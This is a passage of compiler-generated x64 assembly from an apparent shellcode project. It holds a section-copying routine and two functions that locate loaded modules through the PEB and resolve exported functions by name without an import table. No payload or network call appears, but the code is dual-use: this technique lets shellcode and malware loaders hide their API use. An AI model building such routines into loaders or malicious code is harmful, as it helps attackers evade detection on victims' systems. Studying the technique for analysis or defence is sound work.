	mov	eax, DWORD PTR shellSectionSize$[rsp]
	mov	r8d, eax
	mov	rdx, QWORD PTR exeBase$[rsp]
	mov	rcx, QWORD PTR shellSection$[rsp]
	call	QWORD PTR _memcpy$[rsp]
; Line 123
	mov	al, 1
$LN1@CopyTextTo:
; Line 124
	add	rsp, 56					; 00000038H
	ret	0
?CopyTextToShell@@YA_NPEAXKP6APEAX_K@ZP6APEAX0PEBX1@Z@Z ENDP ; CopyTextToShell
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_func_by_name@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?get_func_by_name@@YAPEAXPEAXPEAD@Z PROC		; get_func_by_name, COMDAT
; File C:\Users\6lady\source\shel0101\shell3124\peb-lookup.h
; Line 104
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 105
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 106
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 107
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 109
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 110
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 111
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@get_func_b
; Line 112
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 115
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 116
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 117
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 119
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 120
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 121
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 124
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@get_func_b
$LN2@get_func_b:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@get_func_b:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@get_func_b
; Line 125
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 126
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 127
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 129
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 130
	mov	QWORD PTR k$1[rsp], 0
; Line 131
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@get_func_b
$LN5@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 132
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@get_func_b
	jmp	SHORT $LN6@get_func_b
$LN10@get_func_b:
; Line 133
	jmp	SHORT $LN5@get_func_b
$LN6@get_func_b:
; Line 134
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
; Line 136
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@get_func_b
$LN11@get_func_b:
; Line 138
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 139
	xor	eax, eax
$LN1@get_func_b:
; Line 140
	add	rsp, 120				; 00000078H
	ret	0
?get_func_by_name@@YAPEAXPEAXPEAD@Z ENDP		; get_func_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_module_by_name@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv136 = 8
tv155 = 10
c1$2 = 12
c2$3 = 16
curr_name$4 = 24
curr_module$ = 32
tv132 = 40
tv151 = 44
peb$ = 48
ldr$ = 56
Flink$ = 64
list$ = 72
module_name$ = 128
?get_module_by_name@@YAPEAXPEA_W@Z PROC			; get_module_by_name, COMDAT
; File C:\Users\6lady\source\shel0101\shell3124\peb-lookup.h
; Line 69
$LN16:
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H
; Line 70
	mov	QWORD PTR peb$[rsp], 0
; Line 72
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 76
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 77
	lea	rax, QWORD PTR list$[rsp]
	mov	rcx, QWORD PTR ldr$[rsp]
	mov	rdi, rax
	lea	rsi, QWORD PTR [rcx+16]
	mov	ecx, 16
	rep movsb
; Line 79
	mov	rax, QWORD PTR list$[rsp]
	mov	QWORD PTR Flink$[rsp], rax
; Line 80
	mov	rax, QWORD PTR Flink$[rsp]
	mov	QWORD PTR curr_module$[rsp], rax
$LN15@get_module:
$LN2@get_module:
; Line 82
	cmp	QWORD PTR curr_module$[rsp], 0
	je	$LN3@get_module
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+48], 0
	je	$LN3@get_module
; Line 83
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+96], 0
	jne	SHORT $LN7@get_module
	jmp	SHORT $LN2@get_module
$LN7@get_module:
; Line 84
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$4[rsp], rax
; Line 86
	mov	QWORD PTR i$1[rsp], 0
; Line 87
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN6@get_module
$LN4@get_module:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN6@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
; Line 89
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv132[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv132[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv132[rsp]
	mov	WORD PTR tv136[rsp], ax
	jmp	SHORT $LN12@get_module
$LN11@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv136[rsp], ax
$LN12@get_module:
	movzx	eax, WORD PTR tv136[rsp]
	mov	WORD PTR c1$2[rsp], ax
; Line 90
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv151[rsp], eax
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv151[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv151[rsp]
	mov	WORD PTR tv155[rsp], ax
	jmp	SHORT $LN14@get_module
$LN13@get_module:
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv155[rsp], ax
$LN14@get_module:
	movzx	eax, WORD PTR tv155[rsp]
	mov	WORD PTR c2$3[rsp], ax
; Line 91
	movzx	eax, WORD PTR c1$2[rsp]
	movzx	ecx, WORD PTR c2$3[rsp]
	cmp	eax, ecx
	je	SHORT $LN8@get_module
	jmp	SHORT $LN5@get_module
$LN8@get_module:
; Line 92
	jmp	$LN4@get_module
$LN5@get_module:
; Line 93
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
; Line 95
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@get_module
$LN9@get_module:
; Line 98
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR curr_module$[rsp], rax
; Line 99
	jmp	$LN15@get_module
$LN3@get_module:
; Line 100
	xor	eax, eax
$LN1@get_module:
; Line 101
	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
?get_module_by_name@@YAPEAXPEA_W@Z ENDP			; get_module_by_name
_TEXT	ENDS
END
